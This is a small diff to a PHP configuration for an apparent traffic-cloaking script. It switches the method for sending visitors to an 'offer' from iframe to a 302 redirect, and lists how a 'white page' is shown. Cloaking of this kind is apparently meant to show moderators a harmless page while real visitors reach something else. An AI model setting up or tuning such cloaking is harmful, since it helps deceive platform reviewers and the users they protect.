@@ -11,7 +11,7 @@ $CLOAKING['UTM'] = true;
 /* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
 /* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
 /* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
-$CLOAKING['OFFER_METHOD'] = 'iframe';
+$CLOAKING['OFFER_METHOD'] = '302';
 
 /* WHITE_PAGE display method. Available options: curl, 302 */
 /* 'curl' - uses a server request to display third-party whitepage on your domain */
